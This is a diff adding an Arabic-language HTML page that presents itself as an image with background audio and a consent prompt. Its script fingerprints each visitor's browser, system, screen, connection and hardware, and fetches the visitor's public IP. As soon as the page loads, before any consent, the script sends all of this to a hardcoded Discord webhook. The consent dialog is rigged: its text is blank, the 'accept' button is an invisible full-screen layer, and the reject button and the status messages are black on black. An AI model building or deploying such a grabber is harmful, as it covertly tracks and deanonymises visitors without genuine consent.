@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صورة مع صوت وموافقة</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+            color: #000000;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .image-wrapper {
+            width: 500px;
+            height: 500px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border-radius: 16px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
+            background: #111;
+        }
+        img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .play-overlay {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+            cursor: pointer;
+            user-select: none;
+            z-index: 10;
+        }
+        .consent-modal {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            padding: 16px;
+        }
+        .consent-modal.visible {
+            display: flex;
+        
+        }
+        .consent-card h1 {
+            margin-top: 0;
+            font-size: 24px;
+            margin-bottom: 16px;
+        }
+        .consent-card p,
+        .consent-card li {
+            line-height: 1.6;
+            margin: 8px 0;
+            color: #fe0000;
+        }
+        .consent-card ul {
+            list-style: inside disc;
+            padding-left: 0;
+            margin: 0 0 16px;
+        }
+        .consent-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .consent-actions button {
+            flex: 1 1 120px;
+            padding: 12px 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .consent-accept {
+            background: rgba(0, 0, 0, 0.00); /* neutral translucent */
+            color: #000000;
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            border-radius: 0;
+            font-size: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 60;
+            cursor: pointer;
+        }
+        .consent-reject {
+            background: #000000;
+            color: #000000;
+            border: 1px solid #000000;
+        }
+        .status-text {
+            position: fixed;
+            bottom: 18px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.75);
+            color: #000000;
+            padding: 10px 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 15;
+            display: none;
+        }
+        .status-text.visible {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-wrapper" id="imageWrapper" aria-hidden="false">
+        <img src="testse.png" alt="" id="mainImage">
+    </div>
+
+    <div class="play-overlay" id="playOverlay"></div>
+
+    <div class="consent-modal visible" id="consentModal">
+        <div class="consent-card">
+            <h1></h1>
+            <p></p>
+            <ul>
+            
+            </ul>
+            <div class="consent-actions">
+                <button class="consent-accept" id="acceptConsent"></button>
+                <button class="consent-reject" id="rejectConsent"></button>
+            </div>
+        </div>
+    </div>
+
+    <div class="status-text" id="statusText">جاري الإعداد...</div>
+
+    <audio id="bgAudio" preload="auto">
+        <source src="tesees221m.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        const consentModal = document.getElementById('consentModal');
+        const overlay = document.getElementById('playOverlay');
+        const statusText = document.getElementById('statusText');
+        const audio = document.getElementById('bgAudio');
+        const sessionTokenKey = 'siteSessionToken';
+        const pagesVisitedKey = 'sitePagesVisited';
+        const sessionStart = Date.now();
+        const existingToken = sessionStorage.getItem(sessionTokenKey);
+        const sessionToken = existingToken || `session-${Math.random().toString(36).slice(2)}-${Date.now()}`;
+        if (!existingToken) {
+            sessionStorage.setItem(sessionTokenKey, sessionToken);
+        }
+
+        const pageUrl = window.location.href;
+        const pagesVisited = JSON.parse(sessionStorage.getItem(pagesVisitedKey) || '[]');
+        if (!pagesVisited.includes(pageUrl)) {
+            pagesVisited.push(pageUrl);
+            sessionStorage.setItem(pagesVisitedKey, JSON.stringify(pagesVisited));
+        }
+
+        function showStatus(text) {
+            statusText.textContent = text;
+            statusText.classList.add('visible');
+        }
+
+        function hideStatus() {
+            statusText.classList.remove('visible');
+        }
+
+        function parseBrowser(ua) {
+            const browsers = [
+                { name: 'Chrome', regex: /Chrome\/(\d+\.\d+\.\d+\.\d+)/ },
+                { name: 'Firefox', regex: /Firefox\/(\d+\.\d+)/ },
+                { name: 'Safari', regex: /Version\/(\d+\.\d+)/ },
+                { name: 'Edge', regex: /Edg\/(\d+\.\d+)/ },
+                { name: 'Opera', regex: /OPR\/(\d+\.\d+)/ }
+            ];
+            for (const browser of browsers) {
+                const match = ua.match(browser.regex);
+                if (match) {
+                    return `${browser.name} ${match[1]}`;
+                }
+            }
+            return 'غير معروف';
+        }
+
+        function parseOS(ua) {
+            if (/Windows NT 10\\.0/.test(ua)) return 'Windows 10';
+            if (/Windows NT 6\\.3/.test(ua)) return 'Windows 8.1';
+            if (/Windows NT 6\\.2/.test(ua)) return 'Windows 8';
+            if (/Windows NT 6\\.1/.test(ua)) return 'Windows 7';
+            if (/Mac OS X (\d+[._]\d+)/.test(ua)) return `macOS ${ua.match(/Mac OS X (\d+[._]\d+)/)[1].replace('_', '.')}`;
+            if (/Android (\d+[.\d]*)/.test(ua)) return `Android ${ua.match(/Android (\d+[.\d]*)/)[1]}`;
+            if (/iPhone OS (\d+[._]\d+)/.test(ua)) return `iOS ${ua.match(/iPhone OS (\d+[._]\d+)/)[1].replace('_', '.')}`;
+            if (/iPad; CPU OS (\d+[._]\d+)/.test(ua)) return `iPadOS ${ua.match(/iPad; CPU OS (\d+[._]\d+)/)[1].replace('_', '.')}`;
+            return 'غير معروف';
+        }
+
+        async function gatherVisitorData() {
+            const userAgent = navigator.userAgent || 'غير معروف';
+            const language = navigator.language || navigator.languages?.[0] || 'غير معروف';
+            const languages = navigator.languages ? navigator.languages.join(', ') : language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            const screenResolution = `${screen.width}x${screen.height}`;
+            const windowSize = `${window.innerWidth}x${window.innerHeight}`;
+            const colorDepth = screen.colorDepth || 'غير معروف';
+            const devicePixelRatio = window.devicePixelRatio || 1;
+            const platform = navigator.platform || 'غير معروف';
+            const deviceType = /Mobi|Android/i.test(userAgent) ? 'جوال' : /Tablet|iPad/i.test(userAgent) ? 'تابلت' : 'كمبيوتر';
+            const browserVersion = parseBrowser(userAgent);
+            const osVersion = parseOS(userAgent);
+            const referrer = document.referrer || 'مباشر';
+            const visitTime = new Date().toISOString();
+            const durationMs = Date.now() - sessionStart;
+            const cookiesEnabled = navigator.cookieEnabled ? 'ممكّن' : 'معطّل';
+            const onlineStatus = navigator.onLine ? 'متصل' : 'غير متصل';
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const connectionType = connection.effectiveType || connection.type || 'غير معروف';
+            const downlink = connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف';
+            const rtt = connection.rtt ? `${connection.rtt} ms` : 'غير معروف';
+            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف';
+            const hardwareConcurrency = navigator.hardwareConcurrency || 'غير معروف';
+            const pages = pagesVisited;
+            const source = referrer === 'مباشر' ? 'رابط مباشر' : 'من صفحة أخرى';
+            const publicIp = await getPublicIp();
+
+            return {
+                timezone,
+                userAgent,
+                language,
+                languages,
+                screenResolution,
+                windowSize,
+                colorDepth,
+                devicePixelRatio,
+                platform,
+                deviceType,
+                browserVersion,
+                osVersion,
+                referrer,
+                visitTime,
+                sessionDurationMs: durationMs,
+                pagesVisited: pages,
+                source,
+                cookiesEnabled,
+                onlineStatus,
+                connectionType,
+                downlink,
+                rtt,
+                deviceMemory,
+                hardwareConcurrency,
+                page: pageUrl,
+                sessionId: sessionToken,
+                publicIp,
+                username: 'غير مدخل',
+                email: 'غير مدخل'
+            };
+        }
+
+        let webhookSent = false;
+        const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1533069858307051540/8uURt-sezkOaj8CYwQJ2tP7QlEyF0o1ARtnV_4vnwyLsNHJg4XGWeEh_hIoj5KM-SNiY';
+
+        async function getPublicIp() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) return 'غير متوفر';
+                const data = await response.json();
+                return data.ip || 'غير متوفر';
+            } catch (error) {
+                return 'غير متوفر';
+            }
+        }
+
+        async function sendWebhookPayload(payload, statusMessage) {
+            showStatus(statusMessage);
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    throw new Error(`Webhook request failed: ${response.status}`);
+                }
+                webhookSent = true;
+                showStatus('تم إرسال البيانات بنجاح.');
+            } catch (error) {
+                console.error('Send data failed:', error);
+                showStatus('لم يتم إرسال البيانات. سيتم المتابعة بدون توقف.');
+            }
+        }
+
+        async function sendVisitorData(data, message) {
+            const payload = {
+                content: '',
+                embeds: [
+                    {
+                        title: '????????????????',
+                        description: `خاص ||${message}|| IP ||${data.publicIp}|| محتوى ||معرف الجلسة: ${data.sessionId}||`,
+                        color: 16711680,
+                        fields: [
+                            { name: 'المتصفح', value: data.browserVersion, inline: true },
+                            { name: 'النظام', value: data.osVersion, inline: true },
+                            { name: 'المنصة', value: data.platform, inline: true },
+                            { name: 'اللغة', value: data.language, inline: true },
+                            { name: 'اللغات', value: data.languages, inline: true },
+                            { name: 'المنطقة الزمنية', value: data.timezone, inline: true },
+                            { name: 'دقة الشاشة', value: data.screenResolution, inline: true },
+                            { name: 'حجم النافذة', value: data.windowSize, inline: true },
+                            { name: 'عمق الألوان', value: `${data.colorDepth}`, inline: true },
+                            { name: 'نوع الجهاز', value: data.deviceType, inline: true },
+                            { name: 'حالة الكوكيز', value: data.cookiesEnabled, inline: true },
+                            { name: 'حالة الاتصال', value: data.onlineStatus, inline: true },
+                            { name: 'نوع الاتصال', value: data.connectionType, inline: true },
+                            { name: 'معدل التنزيل', value: data.downlink, inline: true },
+                            { name: 'التأخير (RTT)', value: data.rtt, inline: true },
+                            { name: 'الذاكرة', value: data.deviceMemory, inline: true },
+                            { name: 'المعالجات', value: `${data.hardwareConcurrency}`, inline: true },
+                            { name: 'الصفحة الحالية', value: data.page, inline: false },
+                            { name: 'الصفحة السابقة', value: data.referrer, inline: false },
+                            { name: 'وقت الزيارة', value: data.visitTime, inline: false },
+                            { name: 'مدة الجلسة (مللي ثانية)', value: `${data.sessionDurationMs}`, inline: true },
+                            { name: 'مصدر الزيارة', value: data.source, inline: true },
+                            { name: 'معرف الجلسة', value: data.sessionId, inline: false }
+                        ]
+                    }
+                ]
+            };
+
+            await sendWebhookPayload(payload, 'جاري إرسال البيانات...');
+        }
+
+        async function acceptConsent() {
+            consentModal.classList.remove('visible');
+            overlay.style.background = 'transparent';
+            overlay.style.pointerEvents = 'auto';
+            if (!webhookSent) {
+                showStatus('يرجى الانتظار... يتم إرسال البيانات ثم تشغيل الصوت.');
+                const data = await gatherVisitorData();
+                await sendVisitorData(data, 'تم جمع بيانات زيارة جديدة بعد موافقة المستخدم.');
+            }
+            startAudio();
+        }
+
+        function rejectConsent() {
+            consentModal.classList.remove('visible');
+            overlay.style.background = 'transparent';
+            overlay.style.pointerEvents = 'auto';
+            showStatus('لم تتم الموافقة. اضغط لتشغيل الصوت بدون جمع بيانات.');
+        }
+
+        function startAudio() {
+            audio.play().then(() => {
+                overlay.classList.remove('visible');
+                hideStatus();
+            }).catch(() => {
+                showStatus('اضغط مرة أخرى لتشغيل الصوت.');
+            });
+        }
+
+        document.getElementById('acceptConsent').addEventListener('click', acceptConsent);
+        document.getElementById('rejectConsent').addEventListener('click', rejectConsent);
+
+        overlay.addEventListener('click', () => {
+            startAudio();
+        });
+
+        window.addEventListener('load', async () => {
+            overlay.style.pointerEvents = 'none';
+            showStatus('جاري إرسال بيانات الزيارة فور دخول الموقع...');
+            const data = await gatherVisitorData();
+            await sendVisitorData(data, 'تم جمع بيانات زيارة جديدة فور دخول الموقع.');
+            if (!webhookSent) {
+                showStatus('لم يتم إرسال البيانات تلقائياً. يمكنك الموافقة لتشغيل الصوت.');
+            } else {
+                showStatus('تم إرسال البيانات. اختر موافقة لتشغيل الصوت.');
+            }
+        });
+    </script>
+</body>
+</html>
